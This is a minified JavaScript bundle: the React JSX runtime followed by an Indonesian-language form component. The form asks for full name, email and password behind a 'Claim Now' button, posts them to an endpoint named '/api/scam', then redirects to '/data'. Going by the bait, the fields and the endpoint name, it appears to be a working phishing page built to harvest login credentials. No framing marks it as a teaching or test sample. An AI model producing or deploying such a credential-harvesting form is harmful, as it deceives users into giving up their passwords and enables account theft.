import{r as p}from"./index.DhYZZe0J.js";var m={exports:{}},l={};/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var d=p,c=Symbol.for("react.element"),f=Symbol.for("react.fragment"),x=Object.prototype.hasOwnProperty,_=d.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,y={key:!0,ref:!0,__self:!0,__source:!0};function u(o,e,s){var t,a={},n=null,i=null;s!==void 0&&(n=""+s),e.key!==void 0&&(n=""+e.key),e.ref!==void 0&&(i=e.ref);for(t in e)x.call(e,t)&&!y.hasOwnProperty(t)&&(a[t]=e[t]);if(o&&o.defaultProps)for(t in e=o.defaultProps,e)a[t]===void 0&&(a[t]=e[t]);return{$$typeof:c,type:o,key:n,ref:i,props:a,_owner:_.current}}l.Fragment=f;l.jsx=u;l.jsxs=u;m.exports=l;var r=m.exports;const w=()=>{const[o,e]=p.useState("");async function s(t){t.preventDefault();const a=new FormData(t.target),i=await(await fetch("/api/scam",{method:"POST",body:a})).json();e(i.message),console.log(o),window.location.href="/data"}return r.jsxs("form",{onSubmit:s,children:[r.jsxs("label",{children:["Nama Lengkap",r.jsx("input",{type:"text",name:"nama",id:"nama",autoComplete:"additional-name",required:!0})]}),r.jsxs("label",{children:["Email",r.jsx("input",{type:"email",name:"email",id:"email",autoComplete:"email",required:!0})]}),r.jsxs("label",{children:["Password",r.jsx("input",{type:"password",name:"password",id:"password",autoComplete:"current-password",required:!0})]}),r.jsx("button",{type:"submit",children:"Klaim Sekarang"})]})};export{w as default};
